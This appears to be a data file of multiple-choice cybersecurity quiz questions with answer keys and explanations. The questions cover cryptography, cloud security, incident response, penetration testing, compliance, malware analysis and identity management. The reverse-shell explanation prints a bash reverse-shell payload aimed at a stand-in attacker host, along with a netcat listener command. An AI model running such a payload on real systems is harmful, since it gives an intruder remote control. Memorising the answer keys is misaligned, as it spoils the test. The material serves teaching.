  { question: "What is the purpose of HMAC?", options: ["Hash-based encryption", "Verify both integrity and authenticity of a message using a shared secret key", "Generate random MAC addresses", "Compress messages for efficient storage"], correct: 1, explanation: "HMAC (Hash-based Message Authentication Code) combines a cryptographic hash function with a secret key to produce a MAC that verifies both the integrity (message hasn't been modified) and authenticity (message came from someone who knows the key) of a message. HMAC-SHA256 is widely used in API authentication, JWT signing, and secure cookie verification. Unlike a plain hash, only parties with the secret key can generate or verify the HMAC.", difficulty: "medium", category: "Cryptography", tags: ["HMAC", "MAC", "authentication"], references: ["RFC 2104"] },
  { question: "What is key stretching and why is it important?", options: ["Making encryption keys longer for more security", "Applying a hash function thousands of times to slow down brute force attacks on passwords", "Stretching the key schedule in AES", "Extending RSA key pairs for multiple uses"], correct: 1, explanation: "Key stretching applies a hash function iteratively (thousands to millions of times) to make password-based key derivation deliberately slow. This dramatically increases the time needed for brute force attacks. PBKDF2 uses a configurable iteration count, bcrypt uses a cost factor, scrypt adds memory requirements, and Argon2 adds both time and memory parameters. A single hash takes microseconds; 100,000 iterations takes ~100ms, making large-scale cracking impractical.", difficulty: "medium", category: "Cryptography", tags: ["key stretching", "PBKDF2", "bcrypt"], references: ["NIST SP 800-132"] },
  { question: "What is the birthday attack in cryptography?", options: ["An attack that only works on certain dates", "Exploiting the birthday paradox to find hash collisions faster than brute force", "Attacking systems based on the user's date of birth", "A social engineering technique using birthday information"], correct: 1, explanation: "The birthday attack exploits the birthday paradox: in a group of 23 people, there's a 50% chance two share a birthday. Applied to hash functions: finding a collision requires approximately 2^(n/2) attempts for an n-bit hash, not 2^n. For MD5 (128-bit), a collision requires ~2^64 operations, not 2^128. This is why hash functions need output sizes at least twice the desired security level. SHA-256 provides 128-bit collision resistance.", difficulty: "hard", category: "Cryptography", tags: ["birthday attack", "collision", "probability"], references: ["Applied Cryptography, Schneier"] },

  // ── Cloud Security (10) ──
  { question: "What is the AWS Instance Metadata Service (IMDS) and why is it a security concern?", options: ["A service for managing EC2 instance types", "An HTTP endpoint (169.254.169.254) that provides instance credentials and can be exploited via SSRF", "A DNS service for EC2 instance naming", "A logging service for instance activities"], correct: 1, explanation: "IMDS is an HTTP endpoint at 169.254.169.254 that provides EC2 instances with metadata, including temporary IAM credentials. If an application on the instance is vulnerable to SSRF, an attacker can query IMDS to steal IAM credentials. IMDSv1 is a simple GET request; IMDSv2 requires a PUT request with a token (hop limit 1), significantly reducing SSRF exploitation. The Capital One breach (2019) exploited IMDSv1 via SSRF.", difficulty: "medium", category: "Cloud Security", tags: ["AWS", "IMDS", "SSRF"], references: ["AWS IMDS Documentation", "Capital One Breach 2019"] },
  { question: "What is the Shared Responsibility Model in cloud security?", options: ["Cloud provider and customer share the cost of security tools", "Cloud provider secures the infrastructure; customer secures their data, applications, and configurations", "Both provider and customer have identical security responsibilities", "Customer is responsible for everything including physical security"], correct: 1, explanation: "The Shared Responsibility Model defines that the cloud provider (AWS, Azure, GCP) is responsible for security OF the cloud (physical infrastructure, hypervisor, network, facilities), while the customer is responsible for security IN the cloud (data, IAM, OS patching, application security, network configuration, encryption). The division varies by service type: IaaS gives customers more responsibility than PaaS or SaaS.", difficulty: "easy", category: "Cloud Security", tags: ["shared responsibility", "cloud model"], references: ["AWS Shared Responsibility"] },
  { question: "What is a cloud security posture management (CSPM) tool?", options: ["A tool for managing cloud costs", "A tool that continuously monitors cloud configurations for security misconfigurations and compliance violations", "A cloud-based antivirus solution", "A tool for managing cloud user identities"], correct: 1, explanation: "CSPM tools continuously assess cloud environments for security misconfigurations, compliance violations, and security risks. They check IAM policies, network configurations, encryption settings, logging, and publicly exposed resources against best practices and compliance frameworks (CIS Benchmarks, PCI DSS, SOC 2). Examples: AWS Security Hub, Azure Defender, GCP Security Command Center, Prisma Cloud, Wiz, Orca.", difficulty: "medium", category: "Cloud Security", tags: ["CSPM", "compliance", "monitoring"], references: ["Gartner CSPM"] },
  { question: "What is the principle of least privilege in IAM?", options: ["Give users the minimum permissions needed to perform their job functions", "Create the fewest number of user accounts possible", "Use the simplest authentication method available", "Grant admin access only to the IT department"], correct: 0, explanation: "Least privilege means granting users, services, and applications only the minimum permissions required to perform their specific tasks — nothing more. In cloud IAM, this means: avoid wildcard (*) permissions, use condition keys to restrict scope, prefer managed policies over inline, regularly review and revoke unused permissions, use temporary credentials (IAM roles) over long-lived access keys, and implement just-in-time access for elevated privileges.", difficulty: "easy", category: "Cloud Security", tags: ["IAM", "least privilege", "access control"], references: ["NIST SP 800-53 AC-6"] },
  { question: "What is a service mesh and how does it improve security?", options: ["A network of microservices connected via message queues", "An infrastructure layer that handles service-to-service communication with built-in mTLS, observability, and policy enforcement", "A cloud firewall service", "A mesh VPN connecting cloud regions"], correct: 1, explanation: "A service mesh (Istio, Linkerd, Consul Connect) is a dedicated infrastructure layer for handling service-to-service communication in microservices architectures. Security benefits: automatic mutual TLS (mTLS) between services without code changes, fine-grained authorization policies, traffic encryption, and observability. It moves security from the application layer to the infrastructure layer, ensuring consistent enforcement.", difficulty: "hard", category: "Cloud Security", tags: ["service mesh", "mTLS", "Istio"], references: ["NIST SP 800-204A"] },
  { question: "What is container image scanning?", options: ["Scanning container files for viruses", "Analyzing container images for known vulnerabilities in OS packages and application dependencies", "Monitoring running containers for intrusions", "Scanning container registries for unauthorized access"], correct: 1, explanation: "Container image scanning analyzes the layers of a container image to identify known vulnerabilities (CVEs) in OS packages, application libraries, and dependencies. It should be integrated into CI/CD pipelines (shift-left) and container registries. Tools: Trivy, Grype, Snyk Container, Clair, Prisma Cloud. Best practices: scan in CI/CD, scan in registry, scan running images, enforce policies that block deployment of images with critical vulnerabilities.", difficulty: "medium", category: "Cloud Security", tags: ["containers", "scanning", "DevSecOps"], references: ["NIST SP 800-190"] },
  { question: "What is Infrastructure as Code (IaC) security scanning?", options: ["Scanning physical infrastructure for vulnerabilities", "Analyzing Terraform/CloudFormation templates for security misconfigurations before deployment", "Monitoring infrastructure performance", "Scanning network infrastructure for open ports"], correct: 1, explanation: "IaC security scanning analyzes infrastructure definitions (Terraform, CloudFormation, Pulumi, ARM templates, Kubernetes manifests) for security misconfigurations BEFORE they are deployed. This is a shift-left approach that catches issues like: publicly accessible S3 buckets, unencrypted databases, overly permissive security groups, missing logging, and non-compliant configurations. Tools: Checkov, tfsec, KICS, Bridgecrew, Snyk IaC.", difficulty: "medium", category: "Cloud Security", tags: ["IaC", "Terraform", "shift-left"], references: ["OWASP IaC Security"] },
  { question: "What is the purpose of AWS GuardDuty?", options: ["Manage AWS firewall rules", "Intelligent threat detection service that monitors for malicious activity and unauthorized behavior", "Encrypt data at rest in AWS services", "Manage SSL certificates for AWS resources"], correct: 1, explanation: "AWS GuardDuty is a managed threat detection service that continuously monitors AWS accounts and workloads for malicious activity. It analyzes CloudTrail logs, VPC Flow Logs, and DNS logs using machine learning, anomaly detection, and threat intelligence. It detects: compromised instances, unauthorized access, cryptocurrency mining, data exfiltration, privilege escalation, and reconnaissance. Findings are categorized by severity and can trigger automated remediation via EventBridge.", difficulty: "medium", category: "Cloud Security", tags: ["AWS", "GuardDuty", "threat detection"], references: ["AWS GuardDuty Documentation"] },
  { question: "What is a cloud access security broker (CASB)?", options: ["A cloud-based VPN provider", "A security policy enforcement point between cloud consumers and cloud providers", "A cloud identity provider", "A cloud storage encryption service"], correct: 1, explanation: "A CASB sits between users and cloud services to enforce security policies. Four pillars: 1) Visibility — discover all cloud services in use (shadow IT). 2) Compliance — ensure cloud usage meets regulatory requirements. 3) Data Security — DLP, encryption, tokenization for cloud data. 4) Threat Protection — detect and prevent malicious activity in cloud services. Deployment modes: proxy (forward/reverse), API, or log-based. Examples: Netskope, Zscaler, Microsoft Defender for Cloud Apps.", difficulty: "medium", category: "Cloud Security", tags: ["CASB", "shadow IT", "DLP"], references: ["Gartner CASB"] },
  { question: "What is a Kubernetes Pod Security Standard?", options: ["A standard for pod naming conventions", "Three security profiles (Privileged, Baseline, Restricted) that define security requirements for pods", "A standard for pod resource limits", "A pod networking standard"], correct: 1, explanation: "Kubernetes Pod Security Standards define three profiles: 1) Privileged — unrestricted (for system-level workloads). 2) Baseline — minimally restrictive, prevents known privilege escalations (blocks hostNetwork, hostPID, privileged containers). 3) Restricted — heavily restricted, follows security best practices (blocks root, requires read-only root filesystem, drops all capabilities). Enforced via Pod Security Admission (PSA) controller at namespace level. Replaced the deprecated PodSecurityPolicy (PSP).", difficulty: "hard", category: "Cloud Security", tags: ["Kubernetes", "pod security", "PSA"], references: ["Kubernetes Pod Security Standards"] },

  // ── Incident Response (10) ──
  { question: "What are the six phases of the NIST Incident Response lifecycle?", options: ["Detect, Analyze, Contain, Eradicate, Recover, Learn", "Preparation, Detection & Analysis, Containment, Eradication, Recovery, Post-Incident Activity", "Alert, Triage, Investigate, Remediate, Close, Report", "Monitor, Identify, Protect, Detect, Respond, Recover"], correct: 1, explanation: "NIST SP 800-61 defines six phases: 1) Preparation — tools, training, playbooks. 2) Detection & Analysis — identify and confirm incidents. 3) Containment — limit damage (short-term and long-term strategies). 4) Eradication — remove the threat. 5) Recovery — restore systems to normal operations. 6) Post-Incident Activity — lessons learned, documentation, process improvement. These phases are not strictly linear — teams may iterate between containment, eradication, and recovery.", difficulty: "easy", category: "Incident Response", tags: ["NIST", "IR lifecycle", "phases"], references: ["NIST SP 800-61 Rev 2"] },
  { question: "What is the first thing you should do when you discover a potentially compromised system?", options: ["Immediately shut it down", "Disconnect it from the network but keep it powered on to preserve volatile evidence", "Reimage the system", "Run antivirus scan"], correct: 1, explanation: "Preserving evidence is critical. Power off destroys volatile memory contents (running processes, network connections, logged-in users, encryption keys, malware in memory). Instead: disconnect from network (unplug cable or disable NIC) to prevent further damage and C2 communication, but keep powered on. Document everything. Capture a memory dump before any other action. Then image the disk. This follows the order of volatility principle.", difficulty: "medium", category: "Incident Response", tags: ["evidence", "volatile data", "first response"], references: ["NIST SP 800-86"] },
  { question: "What is the order of volatility in digital forensics?", options: ["Hard drive → RAM → Network connections → CPU registers", "CPU registers → RAM → Network connections → Hard drive → Backups", "Network logs → System logs → Application logs → User files", "Encrypted data → Compressed data → Raw data → Metadata"], correct: 1, explanation: "The order of volatility (RFC 3227) lists evidence from most volatile to least: 1) CPU registers and cache. 2) RAM (running processes, network connections, encryption keys). 3) Network state (routing tables, ARP cache, active connections). 4) Running processes. 5) Disk (file system, swap). 6) Remote logging and monitoring data. 7) Physical configuration. 8) Archival media and backups. Evidence should be collected in this order because the most volatile data is lost first.", difficulty: "medium", category: "Incident Response", tags: ["volatility", "forensics", "evidence"], references: ["RFC 3227"] },
  { question: "What is a chain of custody in digital forensics?", options: ["The encryption chain used to secure evidence", "A documented chronological record of who handled the evidence, when, and what was done", "The authorization chain for accessing evidence", "The sequence of tools used to analyze evidence"], correct: 1, explanation: "Chain of custody is a complete, documented record of everyone who handled a piece of evidence, when they received and transferred it, what they did with it, and how it was stored. It ensures evidence integrity and admissibility in legal proceedings. Breaking the chain (gaps in documentation, unauthorized access) can render evidence inadmissible in court. Use evidence bags, hash verification, write blockers, and detailed logs.", difficulty: "easy", category: "Incident Response", tags: ["chain of custody", "forensics", "legal"], references: ["NIST SP 800-86"] },
  { question: "What is threat hunting?", options: ["Actively searching for threats that have evaded existing security controls", "Installing and configuring threat detection tools", "Responding to security alerts", "Penetration testing the network"], correct: 0, explanation: "Threat hunting is the proactive, hypothesis-driven search for threats that have evaded automated detection systems. Hunters form hypotheses based on threat intelligence, environmental knowledge, and experience, then search for evidence of compromise using tools like SIEM queries, EDR data, network traffic analysis, and endpoint forensics. Unlike incident response (reactive), hunting assumes the attacker is already inside and seeks to find them.", difficulty: "medium", category: "Incident Response", tags: ["threat hunting", "proactive", "detection"], references: ["MITRE ATT&CK for Hunting"] },
  { question: "What Windows Event ID indicates a successful logon?", options: ["4624", "4625", "4634", "4648"], correct: 0, explanation: "Event ID 4624 records successful account logon events in the Windows Security log. Key fields: Logon Type (2=Interactive, 3=Network, 7=Unlock, 10=RemoteInteractive/RDP), account name, source network address, and logon process. Event 4625 = failed logon, 4634 = logoff, 4648 = logon using explicit credentials (RunAs). For incident response, correlate 4624 with logon type and source IP to identify unauthorized access.", difficulty: "easy", category: "Incident Response", tags: ["Windows", "event log", "4624"], references: ["Microsoft Security Auditing"] },
  { question: "What is the purpose of a forensic disk image?", options: ["A backup of important files", "A bit-for-bit copy of the entire storage device, including deleted files and slack space", "A compressed archive of the filesystem", "A snapshot of the operating system configuration"], correct: 1, explanation: "A forensic disk image is a bit-for-bit (sector-level) copy of the entire storage device, capturing everything: allocated files, deleted files, file slack, unallocated space, MBR/GPT, and hidden partitions. Unlike a file backup, it preserves the exact state of the disk for analysis. Tools: dd, dc3dd, FTK Imager, EnCase. Always use a write blocker when imaging to prevent accidental modification. Verify integrity with hash comparison (source vs. image).", difficulty: "medium", category: "Incident Response", tags: ["forensic image", "disk", "evidence"], references: ["NIST SP 800-86"] },
  { question: "What is an Indicator of Compromise (IOC)?", options: ["A vulnerability in the system", "An artifact observed on a network or system that indicates a potential security breach", "A compliance violation", "A risk assessment metric"], correct: 1, explanation: "IOCs are forensic artifacts that indicate a potential security breach has occurred. Examples: malicious IP addresses, domain names, file hashes (MD5/SHA256), registry key modifications, unusual process names, anomalous DNS queries, known malware signatures. IOCs are shared in standardized formats: STIX/TAXII, OpenIOC, YARA rules. They enable organizations to search their environments for evidence of known attacks. IOCs are reactive — they describe known threats, not zero-days.", difficulty: "easy", category: "Incident Response", tags: ["IOC", "indicators", "threat intelligence"], references: ["STIX/TAXII", "OpenIOC"] },
  { question: "What tool is used for Windows memory forensics?", options: ["Autopsy", "Volatility", "Wireshark", "FTK Imager"], correct: 1, explanation: "Volatility (now Volatility 3) is the leading open-source memory forensics framework. It analyzes RAM dumps to extract: running processes (pslist, pstree), network connections (netscan), loaded DLLs (dlllist), registry hives (hivelist), command history (cmdscan), injected code (malfind), and more. Memory analysis can reveal malware that exists only in RAM (fileless), encryption keys, and evidence that disk forensics might miss. Memory must be captured before system shutdown.", difficulty: "medium", category: "Incident Response", tags: ["Volatility", "memory forensics", "RAM"], references: ["Volatility Foundation"] },
  { question: "What is the difference between containment and eradication in incident response?", options: ["They are the same thing", "Containment stops the spread; eradication removes the threat entirely", "Containment is temporary; eradication is permanent network isolation", "Containment is for malware; eradication is for unauthorized access"], correct: 1, explanation: "Containment limits the damage and prevents further spread (e.g., isolating compromised hosts, blocking C2 IPs, disabling compromised accounts) — it's about stopping the bleeding. Eradication removes the threat root cause (e.g., removing malware, closing vulnerabilities, eliminating persistence mechanisms, resetting compromised credentials). Containment must happen first to prevent the attacker from expanding while you work on eradication. Both must be thorough — incomplete eradication leads to reinfection.", difficulty: "medium", category: "Incident Response", tags: ["containment", "eradication", "IR"], references: ["NIST SP 800-61"] },

  // ── Penetration Testing (10) ──
  { question: "What is the difference between black box, white box, and gray box penetration testing?", options: ["They refer to the color of the testing equipment", "Black box = no info, white box = full info, gray box = partial info about the target", "They refer to different compliance requirements", "Black box = external, white box = internal, gray box = both"], correct: 1, explanation: "Black box: tester has no prior knowledge of the target (simulates external attacker). White box: tester has full knowledge — source code, architecture, credentials, network diagrams (simulates insider or comprehensive audit). Gray box: tester has partial knowledge — maybe credentials but no source code, or network ranges but no architecture details. Gray box is often the most realistic and efficient approach for corporate penetration tests.", difficulty: "easy", category: "Penetration Testing", tags: ["black box", "white box", "methodology"], references: ["PTES", "OWASP Testing Guide"] },
  { question: "What is the purpose of a Rules of Engagement (ROE) document in penetration testing?", options: ["Define the scoring system for findings", "Define the scope, boundaries, authorized techniques, emergency contacts, and legal protections for the test", "List the tools the tester must use", "Document the tester's qualifications"], correct: 1, explanation: "The ROE is a legally binding document that defines: scope (in-scope/out-of-scope targets), testing window, authorized techniques, prohibited actions, emergency contacts, communication protocols, data handling requirements, legal authorization, and liability protections. It protects both the tester and the client. Without a proper ROE, penetration testing could be considered unauthorized access (a criminal offense under CFAA and similar laws).", difficulty: "easy", category: "Penetration Testing", tags: ["ROE", "scope", "legal"], references: ["PTES Pre-engagement"] },
  { question: "What is pivoting in penetration testing?", options: ["Rotating between different testing tools", "Using a compromised system as a launchpad to attack other systems on the internal network", "Changing the testing methodology mid-engagement", "Switching between black box and white box approaches"], correct: 1, explanation: "Pivoting uses a compromised system to access and attack other systems that are not directly reachable from the attacker's position. For example, after compromising a web server in the DMZ, the attacker sets up a tunnel through it to reach internal network segments. Tools: SSH tunneling, Chisel, proxychains, Metasploit autoroute, Cobalt Strike SOCKS proxy. Pivoting demonstrates the true impact of a single compromised host.", difficulty: "medium", category: "Penetration Testing", tags: ["pivoting", "lateral movement", "tunneling"], references: ["OSCP Methodology"] },
  { question: "What is the CVSS score range for a 'Critical' severity vulnerability?", options: ["7.0 - 8.9", "9.0 - 10.0", "8.0 - 9.9", "10.0 only"], correct: 1, explanation: "CVSS v3.1 severity ratings: None (0.0), Low (0.1-3.9), Medium (4.0-6.9), High (7.0-8.9), Critical (9.0-10.0). The base score is calculated from Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, and Confidentiality/Integrity/Availability impact. A score of 9.0+ typically indicates a remotely exploitable vulnerability requiring no authentication with high impact (e.g., unauthenticated RCE).", difficulty: "easy", category: "Penetration Testing", tags: ["CVSS", "severity", "scoring"], references: ["FIRST CVSS v3.1"] },
  { question: "What is a reverse shell?", options: ["A shell that reverses the direction of commands", "A shell where the target initiates a connection back to the attacker, providing command execution", "A shell that decrypts encrypted communications", "A shell running on a reverse proxy"], correct: 1, explanation: "A reverse shell is when the compromised target initiates an outbound connection to the attacker's listening machine, providing the attacker with an interactive command shell. This bypasses firewall rules that typically block inbound connections but allow outbound. The attacker sets up a listener (nc -lvnp 4444), and the target connects back. Common payloads: bash -i >& /dev/tcp/attacker/4444 0>&1, python, PHP, PowerShell reverse shells.", difficulty: "easy", category: "Penetration Testing", tags: ["reverse shell", "exploitation", "C2"], references: ["PayloadsAllTheThings"] },
  { question: "What is password spraying?", options: ["Trying many passwords against one account rapidly", "Trying one or a few common passwords against many accounts simultaneously", "Spraying hashed passwords across a network", "A type of rainbow table attack"], correct: 1, explanation: "Password spraying tries a small number of commonly used passwords (e.g., 'Summer2024!', 'Welcome1', 'Password123') against a large number of accounts. Unlike brute force (many passwords vs. one account, which triggers lockouts), spraying tries one password per account per lockout period, staying under the threshold. It's highly effective because there's almost always at least one account with a weak password. Defense: ban common passwords, MFA, smart lockout.", difficulty: "easy", category: "Penetration Testing", tags: ["password spraying", "brute force", "authentication"], references: ["MITRE T1110.003"] },
  { question: "What is the purpose of enumeration in penetration testing?", options: ["Counting the number of vulnerabilities found", "Actively extracting information about users, shares, services, and configurations from target systems", "Listing all tools used during the test", "Creating a numbered list of findings"], correct: 1, explanation: "Enumeration is the phase where testers actively extract detailed information from target systems: usernames, group memberships, network shares, services and versions, email addresses, SNMP data, DNS records, and application details. Unlike passive reconnaissance, enumeration involves direct interaction with target systems. It bridges the gap between reconnaissance and exploitation by identifying specific attack vectors. Tools: enum4linux, smbclient, rpcclient, ldapsearch, nmap scripts.", difficulty: "easy", category: "Penetration Testing", tags: ["enumeration", "reconnaissance", "methodology"], references: ["PTES Information Gathering"] },
  { question: "What is a bind shell vs. a reverse shell?", options: ["Bind shell uses TCP, reverse shell uses UDP", "Bind shell listens on the target; reverse shell connects from the target to the attacker", "Bind shell is encrypted; reverse shell is plaintext", "Bind shell is for Linux; reverse shell is for Windows"], correct: 1, explanation: "Bind shell: the payload opens a listening port on the target, and the attacker connects to it (nc target 4444). Reverse shell: the target connects outbound to the attacker's listener (nc -lvnp 4444). Reverse shells are preferred because: 1) They bypass inbound firewall rules. 2) They traverse NAT (target initiates the connection). 3) They're harder to detect (outbound connections are common). Bind shells are only useful when the target has no firewall filtering inbound connections.", difficulty: "medium", category: "Penetration Testing", tags: ["bind shell", "reverse shell", "exploitation"], references: ["OSCP PWK"] },
  { question: "What is the significance of the /etc/shadow file in Linux?", options: ["It contains system configuration", "It stores hashed passwords for user accounts with restricted access (root only)", "It defines shadow network routes", "It contains encrypted log files"], correct: 1, explanation: "/etc/shadow stores password hashes for all user accounts, separated from /etc/passwd (which is world-readable). Fields: username, hashed password (algorithm$salt$hash), last change date, min/max age, warning period, inactive period, expiration date. The hash format indicates the algorithm: $1$ = MD5, $5$ = SHA-256, $6$ = SHA-512, $2y$ = bcrypt, $y$ = yescrypt. Only root can read this file. In pentesting, obtaining /etc/shadow allows offline password cracking.", difficulty: "medium", category: "Penetration Testing", tags: ["/etc/shadow", "Linux", "passwords"], references: ["Linux man pages shadow(5)"] },
  { question: "What is the purpose of a post-exploitation framework?", options: ["Generate vulnerability reports", "Maintain access, gather intelligence, pivot, and demonstrate business impact after initial compromise", "Fix vulnerabilities after testing", "Monitor the network for new vulnerabilities"], correct: 1, explanation: "Post-exploitation frameworks provide tools for actions after gaining initial access: persistence (survive reboots), privilege escalation, credential harvesting, lateral movement, data collection, and exfiltration. They help demonstrate real-world business impact beyond just 'we got in'. Frameworks: Metasploit Meterpreter, Cobalt Strike Beacon, Sliver, Empire, Covenant. Post-exploitation is often where the most critical findings are discovered — showing what an attacker could actually do with access.", difficulty: "medium", category: "Penetration Testing", tags: ["post-exploitation", "Meterpreter", "C2"], references: ["PTES Post-Exploitation"] },

  // ── Compliance/GRC (5) ──
  { question: "What does PCI DSS stand for and who must comply?", options: ["Payment Card Industry Data Security Standard — any organization that stores, processes, or transmits cardholder data", "Private Cloud Infrastructure DSS — cloud service providers only", "Personal Computer Internet DSS — all internet-connected businesses", "Public Communication Industry DSS — telecommunications companies"], correct: 0, explanation: "PCI DSS (Payment Card Industry Data Security Standard) applies to any organization that stores, processes, or transmits credit card data, regardless of size. It has 12 requirements covering: firewalls, encryption, access control, monitoring, vulnerability management, and security policies. Non-compliance can result in fines ($5,000-$100,000/month), increased transaction fees, or loss of ability to process card payments. Compliance levels (1-4) are based on transaction volume.", difficulty: "easy", category: "Compliance/GRC", tags: ["PCI DSS", "compliance", "payment cards"], references: ["PCI SSC"] },
  { question: "What is the purpose of a risk assessment?", options: ["Identify and install security tools", "Identify, analyze, and evaluate security risks to prioritize mitigation efforts", "Test the network for vulnerabilities", "Train employees on security policies"], correct: 1, explanation: "Risk assessment systematically identifies assets, threats, vulnerabilities, and the likelihood and impact of security incidents. It enables informed decision-making about where to allocate security resources. Steps: 1) Identify assets and their value. 2) Identify threats and vulnerabilities. 3) Analyze likelihood and impact. 4) Calculate risk (Risk = Likelihood × Impact). 5) Prioritize and recommend treatments (mitigate, accept, transfer, avoid). Frameworks: NIST SP 800-30, ISO 27005, FAIR.", difficulty: "easy", category: "Compliance/GRC", tags: ["risk assessment", "risk management"], references: ["NIST SP 800-30"] },
  { question: "What is the difference between a vulnerability assessment and a penetration test?", options: ["They are the same thing with different names", "VA identifies vulnerabilities; pentest attempts to exploit them to demonstrate real impact", "VA is automated; pentest is manual", "VA is for compliance; pentest is optional"], correct: 1, explanation: "Vulnerability assessment identifies and classifies vulnerabilities using automated scanners (Nessus, Qualys, Rapid7) — it provides breadth of coverage but doesn't verify exploitability or demonstrate impact. Penetration testing goes further: testers actively exploit vulnerabilities, chain them together, escalate privileges, and demonstrate what an attacker could actually achieve. VA answers 'what could go wrong?'; pentest answers 'what WILL happen when things go wrong?'. Organizations need both.", difficulty: "easy", category: "Compliance/GRC", tags: ["VA", "pentest", "comparison"], references: ["NIST SP 800-115"] },
  { question: "What is SOC 2 compliance?", options: ["Security Operations Center Level 2 certification", "An audit framework for service organizations based on Trust Service Criteria: Security, Availability, Processing Integrity, Confidentiality, Privacy", "A military security clearance level", "A Sarbanes-Oxley sub-requirement"], correct: 1, explanation: "SOC 2 (System and Organization Controls 2) is an audit framework by AICPA for service organizations. It evaluates controls based on five Trust Service Criteria: Security (mandatory), Availability, Processing Integrity, Confidentiality, and Privacy (optional based on service). Type I reports assess control design at a point in time. Type II reports assess design AND operating effectiveness over a period (typically 6-12 months). SOC 2 reports are increasingly required by enterprise customers evaluating SaaS vendors.", difficulty: "medium", category: "Compliance/GRC", tags: ["SOC 2", "audit", "trust criteria"], references: ["AICPA SOC 2"] },
  { question: "Under GDPR, what is a Data Protection Impact Assessment (DPIA)?", options: ["A technical vulnerability scan of data storage systems", "A systematic assessment of data processing operations to identify and minimize data protection risks", "An annual financial audit of data protection costs", "A background check on data protection officers"], correct: 1, explanation: "A DPIA (Article 35, GDPR) is required when data processing is likely to result in high risk to individuals' rights and freedoms. It must: describe the processing, assess necessity and proportionality, evaluate risks to data subjects, and identify measures to mitigate those risks. Required for: systematic monitoring, large-scale processing of sensitive data, automated decision-making. The DPO must be consulted. If risks can't be mitigated, the supervisory authority must be consulted before processing begins.", difficulty: "hard", category: "Compliance/GRC", tags: ["GDPR", "DPIA", "privacy"], references: ["GDPR Article 35"] },

  // ── Malware Analysis (5) ──
  { question: "What is the difference between static and dynamic malware analysis?", options: ["Static analyzes the malware's network traffic; dynamic analyzes its code", "Static examines code without execution; dynamic observes behavior during execution", "Static uses antivirus; dynamic uses sandbox", "Static is for known malware; dynamic is for unknown"], correct: 1, explanation: "Static analysis examines malware without executing it: disassembly (IDA Pro, Ghidra), string extraction, import/export analysis, PE header inspection, YARA matching, and code review. Dynamic analysis executes the malware in a controlled environment (sandbox) and observes its behavior: file system changes, registry modifications, network connections, process creation, API calls. Both are complementary — static reveals what the malware CAN do; dynamic reveals what it DOES do in practice.", difficulty: "easy", category: "Malware Analysis", tags: ["static", "dynamic", "analysis"], references: ["Practical Malware Analysis, Sikorski"] },
  { question: "What is a sandbox in malware analysis?", options: ["A tool for building malware", "An isolated environment where malware can be safely executed and its behavior observed", "A type of firewall that blocks malware", "A backup system for infected files"], correct: 1, explanation: "A malware sandbox is an isolated virtual environment designed to safely execute and observe malicious software. It monitors: file system activity, registry changes, network communications, process behavior, API calls, and system changes. Modern sandboxes: Cuckoo Sandbox (open-source), ANY.RUN (interactive), Joe Sandbox, VirusTotal, Hybrid Analysis. Challenges: malware may detect sandboxes and alter behavior (anti-sandbox evasion), time-delayed execution, and environment-specific triggers.", difficulty: "easy", category: "Malware Analysis", tags: ["sandbox", "dynamic analysis", "isolation"], references: ["Cuckoo Sandbox Documentation"] },
  { question: "What does the YARA tool do?", options: ["Scan networks for malware", "Create pattern-matching rules to identify and classify malware samples", "Decrypt malware communications", "Remove malware from infected systems"], correct: 1, explanation: "YARA is a tool for creating rules that identify and classify malware based on textual or binary patterns. Rules can match: specific strings, hex sequences, regular expressions, file sizes, entry points, and complex conditions. YARA rules are widely used in: malware research, incident response (scanning endpoints), threat hunting, antivirus engines, and automated malware classification. Example: rule APT28_Backdoor { strings: $s1 = \"sofacy\" condition: any of them }.", difficulty: "medium", category: "Malware Analysis", tags: ["YARA", "signatures", "classification"], references: ["YARA Documentation"] },
  { question: "What is a packer in the context of malware?", options: ["A tool for packaging malware for distribution", "A program that compresses and/or encrypts an executable to evade detection and hinder analysis", "A network tool for packet crafting", "A type of rootkit"], correct: 1, explanation: "Packers compress, encrypt, or obfuscate executable files to: reduce file size, evade signature-based antivirus detection, and hinder reverse engineering. The packed executable contains a stub that unpacks the original code into memory at runtime. Common packers: UPX (legitimate), Themida, VMProtect, ASPack, PECompact. Malware analysts must unpack before analysis. Detection: abnormal section names, high entropy, small import table, stub-like entry point. Tools: Detect It Easy, PEiD, unpacking plugins.", difficulty: "medium", category: "Malware Analysis", tags: ["packer", "obfuscation", "evasion"], references: ["Practical Malware Analysis"] },
  { question: "What are the common stages of a malware lifecycle?", options: ["Download, Install, Run, Delete", "Delivery, Exploitation, Installation, C2, Actions on Objectives (similar to Cyber Kill Chain)", "Compile, Test, Deploy, Monitor", "Encrypt, Spread, Collect, Decrypt"], correct: 1, explanation: "The malware lifecycle closely follows the Cyber Kill Chain: 1) Delivery — malware reaches the target (phishing, drive-by, USB). 2) Exploitation — vulnerability exploited to execute code. 3) Installation — malware installs persistence mechanisms. 4) Command & Control — establishes communication with attacker. 5) Actions on Objectives — data theft, ransomware, lateral movement, espionage. Understanding the lifecycle helps defenders identify and disrupt attacks at each stage.", difficulty: "easy", category: "Malware Analysis", tags: ["lifecycle", "kill chain", "stages"], references: ["Lockheed Martin Cyber Kill Chain"] },

  // ── Identity & Access Management (5) ──
  { question: "What is Multi-Factor Authentication (MFA)?", options: ["Using multiple passwords for one account", "Requiring two or more independent authentication factors from different categories", "Having multiple accounts for redundancy", "Using a password manager"], correct: 1, explanation: "MFA requires authentication using two or more factors from different categories: 1) Something you know (password, PIN). 2) Something you have (phone, hardware token, smart card). 3) Something you are (fingerprint, face, iris). Using two passwords is NOT MFA (both are 'something you know'). MFA dramatically reduces account compromise — even if a password is stolen, the attacker needs the second factor. Strongest: FIDO2/WebAuthn hardware keys (phishing-resistant).", difficulty: "easy", category: "Identity & Access Management", tags: ["MFA", "2FA", "authentication"], references: ["NIST SP 800-63B"] },
  { question: "What is the difference between authentication and authorization?", options: ["They are the same thing", "Authentication verifies identity (who you are); authorization determines access (what you can do)", "Authentication is for users; authorization is for systems", "Authentication uses passwords; authorization uses tokens"], correct: 1, explanation: "Authentication verifies identity — confirming you are who you claim to be (via password, biometrics, certificate, etc.). Authorization determines what an authenticated user is permitted to do — which resources they can access and what actions they can perform. Example: logging into Gmail is authentication; being allowed to read only your own emails is authorization. They are separate concerns: strong authentication without proper authorization still allows unauthorized access.", difficulty: "easy", category: "Identity & Access Management", tags: ["authentication", "authorization", "identity"], references: ["OWASP Authentication"] },
